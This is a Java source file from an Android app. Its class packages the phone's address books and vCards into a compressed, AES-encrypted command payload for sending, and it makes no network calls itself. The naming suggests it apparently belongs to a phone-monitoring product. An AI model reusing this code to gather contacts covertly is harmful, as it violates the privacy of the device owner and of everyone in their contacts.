package com.vvt.phoenix.prot.databuilder;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidKeyException;

import javax.crypto.SecretKey;

import android.os.ConditionVariable;
import android.util.Log;

import com.vvt.phoenix.prot.TransportDirectives;
import com.vvt.phoenix.prot.command.CommandCode;
import com.vvt.phoenix.prot.command.CommandData;
import com.vvt.phoenix.prot.command.CommandMetaData;
import com.vvt.phoenix.prot.command.DataProvider;
import com.vvt.phoenix.prot.command.SendAddressBook;
import com.vvt.phoenix.prot.event.AddressBook;
import com.vvt.phoenix.prot.event.FxVCard;
import com.vvt.phoenix.prot.parser.AddressBookParser;
import com.vvt.phoenix.util.DataBuffer;
import com.vvt.phoenix.util.crypto.AESCipher;
import com.vvt.phoenix.util.crypto.AESEncryptListener;
import com.vvt.phoenix.util.crypto.AESKeyGenerator;
import com.vvt.phoenix.util.zip.GZIPCompressor;
import com.vvt.phoenix.util.zip.GZIPListener;

public class SendAddrBookPayloadBuilder extends PayloadBuilder implements GZIPListener, AESEncryptListener{
	
	//Debugging
	private static final boolean DEBUG = false;
	private static final String TAG = "SendAddrBookPayloadBuilder";

	//Members
	private CommandMetaData mMetaData;
	private CommandData mCommandData;
	private String mPayloadPath;
	private String mCompressPath;
	private String mEncryptPath;
	private boolean mIsResume;
	private FileOutputStream mFileOut;
	private DataBuffer mBuffer;
	private PayloadBuilderResponse mResponse;
	private SecretKey mAesKey;
	private ConditionVariable mLock;

	/**
	 * Constructor
	 */
	public SendAddrBookPayloadBuilder(){
		mLock = new ConditionVariable();
		mResponse = new PayloadBuilderResponse();
		
		mAesKey = AESKeyGenerator.generate();
		mResponse.setAesKey(mAesKey);
	}
	
	/* (non-Javadoc)
	 * @see com.vvt.prot.databuilder.PayloadBuilder#buildPayload(com.vvt.prot.command.CommandMetaData, com.vvt.prot.command.CommandData, java.lang.String)
	 * Operation Method
	 */
	@Override
	public PayloadBuilderResponse buildPayload(CommandMetaData metaData, CommandData commandData, String payloadPath, int transportDirective) throws Exception {
		mMetaData = metaData;
		mCommandData = commandData;
		mPayloadPath = payloadPath;
		if(transportDirective == TransportDirectives.RESUMABLE){
			if(DEBUG){
				Log.v(TAG, "RESUMABLE Command: process data to file");
			}
			mIsResume = true;
			mFileOut = new FileOutputStream(mPayloadPath);
		}else if(transportDirective == TransportDirectives.NON_RESUMABLE){
			if(DEBUG){
				Log.v(TAG, "NON_RESUMABLE Command: process data to buffer");
			}
			mIsResume = false;
			mBuffer = new DataBuffer();
		}
		appendCommandCode();
		appendCommandData();	
		if(mMetaData.getCompressionCode() == 1){
			compressPayload();
		}
		if(mMetaData.getEncryptionCode() == 1){
			encryptPayload();
		}
		
		//Response
		if(mIsResume){
			mResponse.setPayloadPath(payloadPath);
			mResponse.setPayloadType(PayloadType.FILE);
		}else{
			mResponse.setData(mBuffer.toArray());
			mResponse.setPayloadType(PayloadType.BUFFER);
		}
		
		if(DEBUG){
			Log.v(TAG, "Finished");
		}
		
		return mResponse;
	}
	
	@Override
	protected void appendCommandCode() throws IOException {

		if(mIsResume){
			DataBuffer buffer = new DataBuffer();
			buffer.writeShort((short) CommandCode.SEND_ADDRESS_BOOK);
			mFileOut.write(buffer.toArray());
		}else{
			mBuffer.writeShort((short) CommandCode.SEND_ADDRESS_BOOK);
		}
		
	}
	
	@Override
	protected void appendCommandData() throws Exception{
		/*//1 write address book count
		int addressBookCount = mBookRequest.getAddressBookCount();
		DataBuffer buffer = new DataBuffer();
		buffer.writeByte((byte) addressBookCount);
		mFileOut.write(buffer.toArray());
		
		//2 write address book struct and VCard struct
		AddressBook book = null;
		byte[] parsedData = null;
		for(int i=0; i<addressBookCount; i++){
			book = mBookRequest.getAddressBook(i);
			parsedData = AddressBookParser.parseAddressBook(book);
			mFileOut.write(parsedData);
			appendVCardData(book);
		}*/
		
		//1 get data
		SendAddressBook bookData = (SendAddressBook) mCommandData;
		//2 append address book count
		int addressBookCount = bookData.getAddressBookCount();
		if(mIsResume){
			DataBuffer buffer = new DataBuffer();
			buffer.writeByte((byte) addressBookCount);
			mFileOut.write(buffer.toArray());
		}else{
			mBuffer.writeByte((byte) addressBookCount);
		}
		//3 append address book data
		AddressBook book = null;
		byte[] parsedData = null;
		for(int i=0; i<addressBookCount; i++){
			book = bookData.getAddressBook(i);
			parsedData = AddressBookParser.parseAddressBook(book);
			if(mIsResume){
				mFileOut.write(parsedData);
			}else{
				mBuffer.writeBytes(parsedData);
			}
			appendVCardData(book);
		}
			
	}
	private void appendVCardData(AddressBook book) throws IOException{
		DataProvider provider = book.getVCardProvider();
		byte[] parsedData = null;
		while(provider.hasNext()){
			parsedData = AddressBookParser.parseVCard((FxVCard) provider.getObject());
			if(mIsResume){
				mFileOut.write(parsedData);
			}else{
				mBuffer.writeBytes(parsedData);
			}
			
		}
	}

	@Override
	protected void compressPayload()  {
		GZIPCompressor gzip = new GZIPCompressor();
		
		if(mIsResume){
			mCompressPath = mPayloadPath+".compress";		//"a.txt.compress"
			gzip.compressAsynchoronous(mPayloadPath, mCompressPath, this);	// in previous, this line may throw exception from GZIPCompressor but now, GZIPCompressor throw error via its listener
			mLock.block();
			mLock.close();
		}else{
			byte[] zipData = null;
			try {
				zipData = gzip.compressSyncronous(mBuffer.toArray());
			} catch (IOException e) {
				mMetaData.setCompressionCode(0);
				return;
			}
			mBuffer.clearWriter();
			mBuffer.writeBytes(zipData);
		}
		
	}
	
	@Override
	public void onCompressError(Exception err) {
		if(DEBUG){
			Log.e(TAG, "onCompressError()");
		}
		
		mMetaData.setCompressionCode(0);
		mLock.open();
	}

	@Override
	public void onCompressSuccess(String resultPath) {
		if(DEBUG){
			Log.v(TAG, "onCompressSuccess()");
		}
		//remove previous payload
		//and rename new compressed file to original payload name
		File f = new File(mPayloadPath);
		f.delete();
		f = new File(resultPath);
		File dest = new File(mPayloadPath);
		f.renameTo(dest);
		
		mLock.open();
	}
	
	@Override
	protected void encryptPayload(){
		mEncryptPath = mPayloadPath+".encrypt";	//"a.txt.compress.encrypt of a.txt.encrypt"
		//1 generate AES key
		/*mAesKey = AESKeyGenerator.generate();
		mResponse.setAesKey(mAesKey);*/
		
		//2 encrypt it!
		AESCipher cipher = new AESCipher();
		if(mIsResume){
			cipher.encryptASynchronous(mAesKey, mPayloadPath, mEncryptPath, this);
			mLock.block();
			mLock.close();
		}else{
			try {
				byte[] cipherText = AESCipher.encryptSynchronous(mAesKey, mBuffer.toArray());
				mBuffer.clearWriter();
				mBuffer.writeBytes(cipherText);
			} catch (InvalidKeyException e) {
				mMetaData.setEncryptionCode(0);
			}
		}
	}

	@Override
	public void onAESEncryptError(Exception err) {
		if(DEBUG){
			Log.e(TAG, "onAESEncryptError()");
		}
		mMetaData.setEncryptionCode(0);
		mLock.open();
	}

	@Override
	public void onAESEncryptSuccess(String resultPath) {
		
		if(DEBUG){
			Log.v(TAG, "onAESEncryptSuccess()");
		}
		
		//remove previous payload
		//and rename new encrypted file to original payload name
		File f = new File(mPayloadPath);
		f.delete();
		f = new File(resultPath);
		File dest = new File(mPayloadPath);
		f.renameTo(dest);
		
		mLock.open();
		
	}

}
